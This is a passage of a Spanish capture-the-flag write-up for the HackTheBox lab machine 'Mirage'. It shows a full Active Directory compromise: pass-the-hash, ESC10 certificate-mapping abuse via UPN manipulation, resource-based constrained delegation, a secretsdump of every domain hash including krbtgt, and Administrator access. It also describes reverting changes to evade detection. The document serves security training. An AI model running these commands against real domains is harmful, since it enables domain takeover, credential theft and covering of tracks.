msDS-ManagedPassword.B64ENCODED: 43A01mr7V2LGukxowctrHCsLubtNUHxw2zYf7l0REqmep3mfMpizCXlvhv0n8SFG/WKSApJsujGp2+unu/xA6F2fLD4H5Oji/mVHYkkf+iwXjf6Z9TbzVkLGELgt/k2PI4rIz600cfYmFq99AN8ZJ9VZQEqRcmQoaRqi51nSfaNRuOVR79CGl/QQcOJv8eV11UgfjwPtx3lHp1cXHIy4UBQu9O0O5W0Qft82GuB3/M7dTM/YiOxkObGdzWweR2k/J+xvj8dsio9QfPb9QxOE18n/ssnlSxEI8BhE7fBliyLGN7x/pw7lqD/dJNzJqZEmBLLVRUbhprzmG29yNSSjog==
```

Utilizamos ahora el hash NTLM obtenido para realizar un ataque de tipo **Pass-The-Hash** mediante la herramienta `impacket-getTGT`. Esto nos permitió solicitar un Ticket Granting Ticket (TGT) válido como `Mirage-Service$` sin necesidad de conocer la contraseña en texto claro. A partir de ahí, pudimos utilizar el ticket Kerberos para autenticarnos contra otros servicios del dominio como esa cuenta.

```bash
impacket-getTGT mirage.htb/Mirage-Service\$ -hashes :305806d84f7c1be93a07aaf40f0c7866

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Mirage-Service$.ccache
```

Aprovechamos la sesión previa de Evil-WINRM, pero si vemos que nos vuelve a dar en algún momento el PUTO error de reloj de Kerberos, ejecutamos lo siguiente:

```bash
sudo ntpdate -u 10.10.11.78
2025-07-27 07:21:28.518349 (+0200) +305.583273 +/- 0.016997 10.10.11.78 s1 no-leap
CLOCK: time stepped by 305.583273
```

Ejecutamos el comando `reg query` para inspeccionar la clave de registro `SCHANNEL`, que define la configuración de los protocolos de comunicación segura (SSL/TLS) en el sistema. Esto nos permitió comprobar qué versiones de TLS y qué algoritmos de cifrado estaban habilitados, una información útil tanto para evaluar la superficie de ataque como para detectar configuraciones débiles que podrían ser aprovechadas en futuras fases de explotación.

```powershell
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL'

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL
    EventLogging    REG_DWORD    0x1
    CertificateMappingMethods    REG_DWORD    0x4

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\CipherSuites
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Hashes
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\KeyExchangeAlgorithms
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols
```

> Detectamos que el valor `CertificateMappingMethods` estaba configurado como `0x4`, lo que permite mapeo de certificados mediante el campo `AltSecurityIdentities`. Esta configuración es vulnerable y se corresponde con el escenario **ESC10** (abuso de Schannel). Aprovechando esta debilidad, fue posible autenticarse en el dominio generando un certificado personalizado que coincidiera con el valor de ese campo en un usuario objetivo, sin necesidad de conocer sus credenciales.

Para abusar de esto, seguimos estos pasos:

1. **Manipulación UPN**

El siguiente comando usa **`certipy` en modo de actualización de atributos LDAP** para modificar el `userPrincipalName` del usuario `mark.bbond`, estableciéndolo a `dc01$@mirage.htb`, que **es el UPN del controlador de dominio (cuenta de máquina `DC01$`)**.

Esto solo es posible porque:
- Estás autenticado como `mirage-service$`, que tiene privilegios de control sobre `mark.bbond`.    
- Tienes un TGT cargado previamente (por eso se define `KRB5CCNAME`).    
- Se utiliza `certipy-ad account update` para cambiar un atributo LDAP.

```bash
export KRB5CCNAME=Mirage-Service\$.ccache

certipy-ad account update \
   -user 'mark.bbond' \
   -upn 'dc01$@mirage.htb' \
   -u 'mirage-service$@mirage.htb' \
   -k -no-pass \
   -dc-ip 10.10.11.78 \
   -target dc01.mirage.htb

[*] Updating user 'mark.bbond':
    userPrincipalName                   : dc01$@mirage.htb
[*] Successfully updated 'mark.bbond'
```

> Usamos `certipy` con el ticket Kerberos de la cuenta `mirage-service$` para modificar el atributo `userPrincipalName` del usuario `mark.bbond`, estableciéndolo a `dc01$@mirage.htb`, que es el UPN de la cuenta del controlador de dominio. Esta manipulación nos permitió redirigir el mapeo del certificado hacia una cuenta privilegiada (la del DC) al abusar posteriormente de la validación débil de certificados basada en Schannel (`AltSecurityIdentities`), sentando así las bases del ataque ESC10.

2. **Solicitud de certificado**

Primero, obtenemos un **TGT legítimo** para `mark.bbond` (usando su contraseña) y lo exportas como `ccache`, para que `certipy` pueda usarlo en lugar de las credenciales.

```bash
impacket-getTGT mirage.htb/mark.bbond:'1day@atime'
export KRB5CCNAME=mark.bbond.ccache
```

Después, usamos `certipy` para **solicitar un certificado** como `mark.bbond` usando una plantilla válida (`User`).  
Pero **debido a que el UPN de `mark.bbond` fue previamente modificado a `dc01$@mirage.htb`**, el certificado emitido contendrá ese UPN... es decir, **será tratado como si perteneciera al controlador de dominio**.

```bash
certipy-ad req \
   -u 'mark.bbond@mirage.htb' \
   -k -no-pass \
   -dc-ip 10.10.11.78 \
   -target 'dc01.mirage.htb' \
   -ca 'mirage-DC01-CA' \
   -template 'User'

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 10
[*] Successfully requested certificate
[*] Got certificate with UPN 'dc01$@mirage.htb'
[*] Certificate object SID is 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Saving certificate and private key to 'dc01.pfx'
[*] Wrote certificate and private key to 'dc01.pfx'
```

> A continuación, solicitamos un certificado para la cuenta `mark.bbond` utilizando su contraseña legítima y la plantilla `User`. Sin embargo, como previamente habíamos modificado su `userPrincipalName` a `dc01$@mirage.htb`, el certificado emitido por la CA incluía ese UPN, haciendo que se le reconociera como si fuera la cuenta del controlador de dominio. Este comportamiento, resultado del mapeo débil de certificados (`ESC10`), nos permitió emitir un certificado válido que representaba al DC sin haber comprometido directamente su cuenta.

3. **Reversión o restauración del UPN original**

```bash
export KRB5CCNAME=Mirage-Service\$.ccache
certipy-ad account update \
   -user 'mark.bbond' \
   -upn 'mark.bbond@mirage.htb' \
   -u 'mirage-service$@mirage.htb' \
   -k -no-pass \
   -dc-ip 10.10.11.78 \
   -target dc01.mirage.htb

[*] Updating user 'mark.bbond':
    userPrincipalName                   : mark.bbond@mirage.htb
[*] Successfully updated 'mark.bbond'
```

Este comando vuelve a establecer el `userPrincipalName` de `mark.bbond` a su valor legítimo (`mark.bbond@mirage.htb`), restaurando el estado original del objeto en Active Directory.

Esto es importante porque:
- El cambio previo a `dc01$@mirage.htb` era **una manipulación peligrosa y detectable**.    
- Revertirlo ayuda a **evitar sospechas** y **limpiar evidencias** del ataque.    
- En entornos reales, forma parte de una **post-explotación sigilosa y profesional**.

> Tras obtener el certificado malicioso, revertimos el atributo `userPrincipalName` de `mark.bbond` a su valor original (`mark.bbond@mirage.htb`) utilizando nuevamente `certipy` con el ticket de `mirage-service$`. Esta acción restauró el estado legítimo del objeto en el dominio, eliminando la traza evidente del ataque y reduciendo la posibilidad de detección durante auditorías posteriores.

4. **Autenticación Schannel y Suplantación de Identidad**

```bash
certipy-ad auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell
```

> Finalmente, utilizamos `certipy` para autenticarnos directamente contra el controlador de dominio utilizando el certificado `.pfx` generado previamente, que contenía el UPN `dc01$@mirage.htb`. Gracias al mapeo débil basado en Schannel (ESC10), este certificado fue aceptado como válido, permitiéndonos abrir una sesión LDAP interactiva autenticados como la propia cuenta del DC. Con ello, obtuvimos acceso total al dominio.

Al usar el certificado obtenido en el paso anterior con la opción `-ldap-shell` de `certipy`, conseguimos una shell LDAP autenticada como la cuenta del controlador de dominio (`dc01$`). Esta shell nos otorgó control total sobre el directorio, ya que el servidor LDAP aceptó la autenticación basada en certificado mediante Schannel, asociándola directamente a la cuenta privilegiada del DC gracias al UPN contenido en el certificado.

```ldap-shell
# set_rbcd dc01$ Mirage-Service$
Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000

Found Grantee DN: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1112
Delegation rights modified successfully!
Mirage-Service$ can now impersonate users on dc01$ via S4U2Proxy
```

Desde la shell LDAP, configuramos delegación restringida basada en recursos (RBCD) permitiendo que la cuenta `Mirage-Service$` pudiera suplantar al controlador de dominio (`dc01$`). Posteriormente, utilizamos `impacket-getST` para solicitar un ticket de servicio (`TGS`) suplantando a `dc01$` contra el servicio CIFS del propio DC, y exportamos dicho ticket para su uso. Finalmente, ejecutamos `secretsdump` con autenticación Kerberos usando ese ticket, lo que nos permitió volcar todos los hashes del dominio, incluyendo el de `krbtgt`, obteniendo así acceso total al entorno Active Directory.

```bash
impacket-getST -spn 'cifs/DC01.mirage.htb' -impersonate 'dc01$' -dc-ip 10.10.11.78  'mirage.htb/Mirage-Service$' -hashes :305806d84f7c1be93a07aaf40f0c7866

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating dc01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc01$@cifs_DC01.mirage.htb@MIRAGE.HTB.ccache
```

Ejecutamos `impacket-getST` para llevar a cabo el ataque de delegación restringida. Primero obtuvimos un TGT válido para la cuenta `Mirage-Service$` usando su hash NTLM. Luego, mediante la extensión Kerberos **S4U2Self**, solicitamos un ticket como si fuésemos `dc01$`. Finalmente, utilizamos **S4U2Proxy** para obtener un ticket de acceso al servicio CIFS del propio DC, suplantando a `dc01$`. El resultado fue un ticket Kerberos válido que nos permitió autenticarnos como el controlador de dominio en servicios sensibles. 

```bash
export KRB5CCNAME='dc01$@cifs_DC01.mirage.htb@MIRAGE.HTB.ccache'

impacket-secretsdump -k -no-pass -dc-ip 10.10.11.78 dc01.mirage.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1adcc3d4a7f007ca8ab8a3a671a66127:::
mirage.htb\Dev_Account_A:1104:aad3b435b51404eeaad3b435b51404ee:3db621dd880ebe4d22351480176dba13:::
mirage.htb\Dev_Account_B:1105:aad3b435b51404eeaad3b435b51404ee:fd1a971892bfd046fc5dd9fb8a5db0b3:::
mirage.htb\david.jjackson:1107:aad3b435b51404eeaad3b435b51404ee:ce781520ff23cdfe2a6f7d274c6447f8:::
mirage.htb\javier.mmarshall:1108:aad3b435b51404eeaad3b435b51404ee:694fba7016ea1abd4f36d188b3983d84:::
mirage.htb\mark.bbond:1109:aad3b435b51404eeaad3b435b51404ee:8fe1f7f9e9148b3bdeb368f9ff7645eb:::
mirage.htb\nathan.aadam:1110:aad3b435b51404eeaad3b435b51404ee:1cdd3c6d19586fd3a8120b89571a04eb:::
mirage.htb\svc_mirage:2604:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
Mirage-Service$:1112:aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866:::
[*] Kerberos keys grabbed
mirage.htb\Administrator:aes256-cts-hmac-sha1-96:09454bbc6da252ac958d0eaa211293070bce0a567c0e08da5406ad0bce4bdca7
mirage.htb\Administrator:aes128-cts-hmac-sha1-96:47aa953930634377bad3a00da2e36c07
mirage.htb\Administrator:des-cbc-md5:e02a73baa10b8619
krbtgt:aes256-cts-hmac-sha1-96:95f7af8ea1bae174de9666c99a9b9edeac0ca15e70c7246cab3f83047c059603
krbtgt:aes128-cts-hmac-sha1-96:6f790222a7ee5ba9d2776f6ee71d1bfb
krbtgt:des-cbc-md5:8cd65e54d343ba25
mirage.htb\Dev_Account_A:aes256-cts-hmac-sha1-96:e4a6658ff9ee0d2a097864d6e89218287691bf905680e0078a8e41498f33fd9a
mirage.htb\Dev_Account_A:aes128-cts-hmac-sha1-96:ceee67c4feca95b946e78d89cb8b4c15
mirage.htb\Dev_Account_A:des-cbc-md5:26dce5389b921a52
mirage.htb\Dev_Account_B:aes256-cts-hmac-sha1-96:5c320d4bef414f6a202523adfe2ef75526ff4fc6f943aaa0833a50d102f7a95d
mirage.htb\Dev_Account_B:aes128-cts-hmac-sha1-96:e05bdceb6b470755cd01fab2f526b6c0
mirage.htb\Dev_Account_B:des-cbc-md5:e5d07f57e926ecda
mirage.htb\david.jjackson:aes256-cts-hmac-sha1-96:3480514043b05841ecf08dfbf33d81d361e51a6d03ff0c3f6d51bfec7f09dbdb
mirage.htb\david.jjackson:aes128-cts-hmac-sha1-96:bd841caf9cd85366d254cd855e61cd5e
mirage.htb\david.jjackson:des-cbc-md5:76ef68d529459bbc
mirage.htb\javier.mmarshall:aes256-cts-hmac-sha1-96:20acfd56be43c1123b3428afa66bb504a9b32d87c3269277e6c917bf0e425502
mirage.htb\javier.mmarshall:aes128-cts-hmac-sha1-96:9d2fc7611e15be6fe16538ebb3b2ad6a
mirage.htb\javier.mmarshall:des-cbc-md5:6b3d51897fdc3237
mirage.htb\mark.bbond:aes256-cts-hmac-sha1-96:dc423caaf884bb869368859c59779a757ff38a88bdf4197a4a284b599531cd27
mirage.htb\mark.bbond:aes128-cts-hmac-sha1-96:78fcb9736fbafe245c7b52e72339165d
mirage.htb\mark.bbond:des-cbc-md5:d929fb462ae361a7
mirage.htb\nathan.aadam:aes256-cts-hmac-sha1-96:b536033ac796c7047bcfd47c94e315aea1576a97ff371e2be2e0250cce64375b
mirage.htb\nathan.aadam:aes128-cts-hmac-sha1-96:b1097eb42fd74827c6d8102a657e28ff
mirage.htb\nathan.aadam:des-cbc-md5:5137a74f40f483c7
mirage.htb\svc_mirage:aes256-cts-hmac-sha1-96:937efa5352253096b3b2e1d31a9f378f422d9e357a5d4b3af0d260ba1320ba5e
mirage.htb\svc_mirage:aes128-cts-hmac-sha1-96:8d382d597b707379a254c60b85574ab1
mirage.htb\svc_mirage:des-cbc-md5:2f13c12f9d5d6708
DC01$:aes256-cts-hmac-sha1-96:4a85665cd877c7b5179c508e5bc4bad63eafe514f7cedb0543930431ef1e422b
DC01$:aes128-cts-hmac-sha1-96:94aa2a6d9e156b7e8c03a9aad4af2cc1
DC01$:des-cbc-md5:cb19ce2c733b3ba8
Mirage-Service$:aes256-cts-hmac-sha1-96:80bada65a4f84fb9006013e332105db15ac6f07cb9987705e462d9491c0482ae
Mirage-Service$:aes128-cts-hmac-sha1-96:ff1d75e3a88082f3dffbb2b8e3ff17dd
Mirage-Service$:des-cbc-md5:c42ffd455b91f208
[*] Cleaning up... 
```

> Finalmente, utilizamos `secretsdump` en modo Kerberos para conectarnos al controlador de dominio con el ticket TGS que habíamos generado suplantando a `dc01$`. Al confiar el DC plenamente en su propia cuenta de máquina, se permitió la ejecución del método `DRSUAPI`, el cual nos proporcionó un volcado completo de los secretos del dominio: hashes NTLM, claves Kerberos y, en particular, el hash de `krbtgt`, lo que nos otorga la capacidad de generar Golden Tickets y comprometer por completo el entorno Active Directory.

Con el hash NTLM de la cuenta `Administrator` extraído previamente, ejecutamos un ataque de Pass-The-Hash mediante `impacket-getTGT` para obtener un ticket TGT válido. Exportamos dicho ticket y utilizamos `evil-winrm` en modo Kerberos para autenticarnos remotamente en el DC como `Administrator`. Este paso final nos otorgó acceso completo y directo al sistema, consolidando el compromiso total del entorno Active Directory.

```bash
impacket-getTGT mirage.htb/administrator -hashes aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in administrator.ccache
```

Lo exportamos, como siempre:

```bash
export KRB5CCNAME=administrator.ccache
```

Y finalmente lanzamos evil-winrm:

```bash
evil-winrm -i dc01.mirage.htb -r mirage.htb
```

Y ya está, máquina pwneada por completo.

![[mirage14.png]]

Obtenemos la flag, que se encuentra en el Escritorio del Administrador, y terminamos. 

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
3ed7e00c277d0a7baca34103161b4a53
```